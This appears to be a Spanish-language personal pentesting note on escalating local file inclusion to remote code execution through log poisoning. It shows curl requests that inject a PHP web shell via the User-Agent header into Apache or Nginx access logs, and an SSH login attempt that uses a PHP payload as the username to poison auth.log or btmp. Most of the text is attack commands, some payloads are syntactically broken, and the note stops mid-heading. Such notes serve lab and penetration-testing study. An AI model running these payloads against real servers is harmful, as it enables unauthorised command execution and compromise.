#### LFI -> RCE con LogPoisoning

Si se tiene la capacidad de listar archivos internos, se puede probar listar los logs con el siguiente comando

-----
##### Apache/Nginx Log Poisoning 

**/var/log/apache2(o nginx)/access.log** --> Este directorio contiene los logs de Apache. Para explotar el **LogPoisoning**, podemos enviar el siguiente comando:
Cuando podemos listar los logs, es probable que nos devuelva info de la peticion, por ejemplo si le hacemos un curl, nos va a devolver nuesto _User-Agent_:

![[Pasted image 20251217164516.png|800]]
Y si probamos cambiar el User-Agent? podemos enviar la siguiente peticion 
```bash
curl -s -X GET "http://localhost/index.php" -H "User-Agent: PROBANDO ?>"
```
y tal vez nos devuelva algo como esto:
![[Pasted image 20251217164717.png|800]]

Ahora vamos a intentar insertar codigo php en el _User-Agent_:

```bash
curl -s -X GET "http://localhost/index.php" -H "User-Agent: <?php system('\$_GET['cmd']); ?>"
``` 
_\ para escapar el $_

Luego de este comando, podemos simplemente entrar a _/var/log/apache2/access.log_ y se deberia poder ver reflejado el output, sino, lo que se puede hacer, es este comando:
```bash
curl -s -X GET "http://localhost/index.php" -H "User-Agent: <?php phpinfo(); ?>"
```

_phpinfo()_ --> Esto es una funcion de php que muestra una "configuracion", podes filtrar por _disable_functions_ y ver si  la funcion **system()** esta disponible **RCE**.

---------
##### SSH Log Poisoning

**/var/log/auth.log** --> Este suele ser el archivo de logs de _SSH_. Pero tambien puede ser **/var/log/btmp** (en versiones mas nuevas).

Se puede ejecutar el siguiente comando:

```bash
ssh prueba@172.17.0.2 
```

Y se deberia ver el fallo de autenticacion en el **auth.log** o **btmp**. 

```bash
ssh '<?php system[$_GET["cmd"]]; ?>'
```

Esto te puede llegar a dar un parametro cmd, donde se pueden ejecutar comandos (`http://localhost/prueba.php?cmd=whoami`). Los comandos se deberian ver reflejados en **auth.log** o **btmp**. 

----

##### App 